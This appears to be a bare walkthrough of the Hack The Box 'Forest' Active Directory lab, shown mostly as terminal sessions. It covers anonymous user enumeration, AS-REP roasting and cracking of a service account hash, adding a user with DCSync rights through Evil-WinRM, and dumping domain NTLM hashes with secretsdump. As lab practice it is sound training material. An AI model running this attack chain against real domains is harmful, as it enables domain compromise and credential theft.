
```bash
┌──(arun㉿kali)-[~/AD/HTB/Forest]
└─$ rpcclient -N -U "" 10.10.10.161
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
rpcclient $> 

```



```bash
┌──(arun㉿kali)-[~/AD/HTB/Forest]
└─$ impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb.local/ -usersfile user.txt
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:2174bd69ef5855b91cf7b78669678dcd$2ed03e6f287212bbb90eb8602760d414f34d6190c14330b2dce42a8e816266270fed604bd9d3230e0a294b1f7500e8b7fa412298dd4412e1378e816bc1ea3639cae8d278bed1ec4ff8b951b14d203d8b7eb29b038c9b87d3f1c06a9a2c3fcc32fe3be9f6ef854e8d5f2c32efc6f4a1d2133164cc7a214a5fa003578180d80adc788a908ee5fd74e6b736ea25cd80781fb81d3cc3e44d48821ab8a9dda252b4d983f120320d65debf3ad9cdebf5ae68fc735eea0fed2961da6fc30646b179cd42818d5ddd7cce0029ba08efc74cd9cedbb4580205b39023bb331e42bf8cb260a56e9c8e9130bd
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax


```

```bash
┌──(arun㉿kali)-[~/AD/HTB/Forest]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:19 DONE (2023-02-08 09:26) 0.05184g/s 211807p/s 211807c/s 211807C/s s401447401447401447..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

$pass = convertto-securestring 'pass123!' -asplain -force


$cred = new-object system.management.automation.pscredential('htb\arun', $pass)


```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user arun pass123! /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" arun /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" arun /add
The command completed successfully.
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = convertto-securestring 'pass123!' -asplain -force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = new-object system.management.automation.pscredential('htb\arun', $pass)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-ObjectACL -PrincipalIdentity arun -Credential $cred -Rights DCSync
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group 'Exchange Windows Permissions'
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members

-------------------------------------------------------------------------------
arun
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 

```

```bash
                                                                                                                                                                        
┌──(arun㉿kali)-[~]
└─$ impacket-secretsdump htb.local/arun@10.10.10.161
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```